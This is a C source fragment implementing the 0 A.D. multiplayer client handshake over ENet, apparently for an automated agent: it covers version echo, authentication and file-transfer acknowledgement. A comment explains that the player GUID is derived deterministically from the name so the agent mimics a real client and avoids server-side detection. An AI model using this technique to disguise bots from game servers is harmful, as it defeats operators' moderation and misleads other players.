#ifdef C2_IMPLEMENT_HANDSHAKE
#include <enet/enet.h>

/* C2SrvInfo: parsed information from the server's handshake packet.
 * Stores the engine version string ("0.0.26") and up to 16 active mods.
 * The agent must echo this back verbatim in its CLIENT_HANDSHAKE reply,
 * or the server will reject the connection (protocol version mismatch). */
typedef struct{
    char engine[64];char mod_name[16][128];char mod_ver[16][64];
    int nmod;uint32_t proto;
}C2SrvInfo;

static inline void _send_ft_ack(ENetPeer *p,ENetHost *h,uint32_t rid,uint32_t n){
    uint8_t pl[8],pkt[16];size_t off=0;
    off+=wu32(pl+off,rid);off+=wu32(pl+off,n);
    size_t pk=mk_pkt(pkt,NMT_FILE_TRANSFER_ACK,pl,off);
    enet_peer_send(p,0,enet_packet_create(pkt,pk,ENET_PACKET_FLAG_RELIABLE));
    enet_host_flush(h);}
static inline void _send_loaded_game(ENetPeer *p,ENetHost *h,uint32_t t){
    uint8_t pl[4],pkt[8];wu32(pl,t);
    size_t pk=mk_pkt(pkt,NMT_LOADED_GAME,pl,4);
    enet_peer_send(p,0,enet_packet_create(pkt,pk,ENET_PACKET_FLAG_RELIABLE));
    enet_host_flush(h);}
static inline void _send_rejoined(ENetPeer *p,ENetHost *h){
    uint8_t pl[4],pkt[8];wu32(pl,0);
    size_t pk=mk_pkt(pkt,NMT_REJOINED,pl,4);
    enet_peer_send(p,0,enet_packet_create(pkt,pk,ENET_PACKET_FLAG_RELIABLE));
    enet_host_flush(h);}

static int c2_do_handshake(ENetPeer *peer,ENetHost *host,
                            C2SrvInfo *srv,const char *name){
#ifdef AGENT_DEBUG
#define _HS_DBG(fmt,...) fprintf(stderr,"[HS] " fmt,##__VA_ARGS__);fflush(stderr)
#else
#define _HS_DBG(fmt,...) ((void)0)
#endif
    ENetEvent ev;int state=0;uint32_t ft_total=0,ft_recv=0;
    _HS_DBG("entering handshake\n");
    while(1){
        int _ret=enet_host_service(host,&ev,8000);
        _HS_DBG("enet_host_service ret=%d evtype=%d state=%d\n",_ret,_ret>0?(int)ev.type:-1,state);
        if(_ret<=0) break;
        if(ev.type==ENET_EVENT_TYPE_DISCONNECT){_HS_DBG("DISCONNECT state=%d reason=%u\n",state,(unsigned)ev.data);return -1;}
        if(ev.type!=ENET_EVENT_TYPE_RECEIVE) continue;
        const uint8_t *d=ev.packet->data;size_t dl=ev.packet->dataLength;
        if(dl<3){enet_packet_destroy(ev.packet);continue;}
        uint8_t type=d[0];const uint8_t *pl=d+3,*end=d+dl;
        _HS_DBG("pkt type=%u len=%zu state=%d\n",type,dl,state);
        if(type==NMT_SERVER_HANDSHAKE&&state==0){
            if(pl+8>end){enet_packet_destroy(ev.packet);return -1;}
            srv->proto=ru32(pl+4);
            const uint8_t *p=pl+8;srv->nmod=0;
            size_t c=rcstr(p,(size_t)(end-p),srv->engine,sizeof(srv->engine));p+=c;
            while(p<end&&srv->nmod<16){
                c=rcstr(p,(size_t)(end-p),srv->mod_name[srv->nmod],128);if(!c)break;p+=c;
                c=rcstr(p,(size_t)(end-p),srv->mod_ver[srv->nmod],64);if(!c)break;p+=c;
                srv->nmod++;}
            _HS_DBG("SRV_HS engine='%s' proto=0x%08x nmod=%d\n",srv->engine,srv->proto,srv->nmod);
            uint8_t plb[1024];size_t off=0;
            off+=wu32(plb+off,MAGIC_CLIENT);off+=wu32(plb+off,srv->proto);
            off+=wcstr(plb+off,srv->engine);
            for(int i=0;i<srv->nmod;i++){
                off+=wcstr(plb+off,srv->mod_name[i]);off+=wcstr(plb+off,srv->mod_ver[i]);}
            uint8_t pkt[1200];size_t pklen=mk_pkt(pkt,NMT_CLIENT_HANDSHAKE,plb,off);
            enet_peer_send(peer,0,enet_packet_create(pkt,pklen,ENET_PACKET_FLAG_RELIABLE));
            enet_host_flush(host);state=1;_HS_DBG("→ CLIENT_HANDSHAKE sent (%zu bytes)\n",pklen);}
        else if(type==NMT_SERVER_HANDSHAKE_RESPONSE&&state==1){
            _HS_DBG("SRV_HS_RESPONSE → AUTH name='%s'\n",name);
            uint8_t pl2[512];size_t off=0;
            /* Derive a fully deterministic GUID from the player name using FNV-1a.
         * A real 0AD client stores its GUID in a config file and always sends
         * the same one. All 6 UUID fields are derived from the name hash so
         * the GUID is identical across reconnections — flagging a changing GUID
         * is a trivial server-side detection technique. */
        char _guid[37];
        uint32_t _h1=fnv32(name), _h2=_h1^0x6C6F6C63u;  /* 0x6C6F6C63 = "locl" XOR scramble */
        uint32_t _h3=_h1*2654435761u, _h4=_h2*2246822519u; /* Knuth multiplicative hash */
        snprintf(_guid,sizeof(_guid),"%08x-%04x-%04x-%04x-%08x%04x",
                 _h1,(_h2>>16)&0xFFFF,_h2&0xFFFF,(_h3>>16)&0xFFFF,_h4,_h3&0xFFFF);
        off+=wcstrw(pl2+off,name);off+=wcstr(pl2+off,"");off+=wcstr(pl2+off,_guid);
            uint8_t pkt[520];size_t pklen=mk_pkt(pkt,NMT_AUTHENTICATE,pl2,off);
            enet_peer_send(peer,0,enet_packet_create(pkt,pklen,ENET_PACKET_FLAG_RELIABLE));
            enet_host_flush(host);state=2;}
        else if(type==NMT_AUTHENTICATE_RESULT&&state==2){
            uint32_t code=(dl>=7)?ru32(pl):99;
            _HS_DBG("AUTH_RESULT code=%u\n",code);
            if(code!=1&&code!=2){enet_packet_destroy(ev.packet);return 0;}
            state=3;}
        else if(type==NMT_FILE_TRANSFER_RESPONSE&&state==3){
            if(dl>=11){ft_total=ru32(pl+4);ft_recv=0;
                _HS_DBG("FT_RESPONSE total=%u\n",ft_total);}}
        else if(type==NMT_FILE_TRANSFER_DATA&&state==3){
            if(dl>=11){uint32_t rid=ru32(pl),datalen=ru32(pl+4);ft_recv+=datalen;
                _HS_DBG("FT_DATA rid=%u len=%u (%u/%u)\n",rid,datalen,ft_recv,ft_total);
                _send_ft_ack(peer,host,rid,1);
                if(ft_total>0&&ft_recv>=ft_total){_send_loaded_game(peer,host,0);state=4;}}}
        else if(type==NMT_JOIN_SYNC_START&&(state==3||state==4)){
            _HS_DBG("JOIN_SYNC_START\n");
            if(state==3){_send_loaded_game(peer,host,0);state=4;}}
        else if(type==NMT_LOADED_GAME&&state==4){
            _HS_DBG("LOADED_GAME → OK\n");
            _send_rejoined(peer,host);enet_packet_destroy(ev.packet);return 0;}
        /* Catch-up END_COMMAND_BATCH: the server sends N of them before LOADED_GAME(readyTurn).
         * We consume them silently; the NMT_LOADED_GAME handler above will trigger
         * REJOINED once all catch-up packets are exhausted. */
        else{_HS_DBG("pkt ignored type=%u state=%d\n",type,state);}
        enet_packet_destroy(ev.packet);}  /* end while */
    _HS_DBG("loop end state=%d\n",state);
    return -1;
#undef _HS_DBG
}
#endif /* C2_IMPLEMENT_HANDSHAKE */
